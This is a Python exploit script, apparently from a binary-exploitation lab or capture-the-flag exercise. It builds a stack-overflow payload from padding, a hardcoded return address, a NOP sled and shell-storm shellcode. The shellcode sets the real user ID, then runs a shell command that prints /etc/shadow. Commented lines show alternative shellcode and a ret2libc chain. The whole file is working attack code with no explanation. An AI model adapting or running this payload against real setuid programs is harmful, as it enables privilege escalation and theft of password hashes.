import struct
import sys
off = 116

def p32(x):
    return struct.pack("<I", x)

# Shellcode : http://shell-storm.org/shellcode/files/shellcode-216.php
shellcode = b""
shellcode += b"\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99" 
shellcode += b"\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
shellcode += b"\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff"
shellcode += b"cat /etc/shadow; ./realuid; exit;";

# shellcode = (
# b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
# b'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
# b'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
# )

nopsled = b"\x90" * 16
padding = b"A" * off
endp = b"C" * 100
# eip=b"BBBB"
eip = p32(0xffffd1a0)

payload = b""
payload += padding
payload += eip
payload += nopsled
payload += shellcode
payload += endp
# payload += p32(0xffffd13c)
# payload += p32(0xf7e07000) # system
# payload += p32(0xf7df9950) # exit
# payload += p32(0xf7f4e338)
sys.stdout.buffer.write (payload)
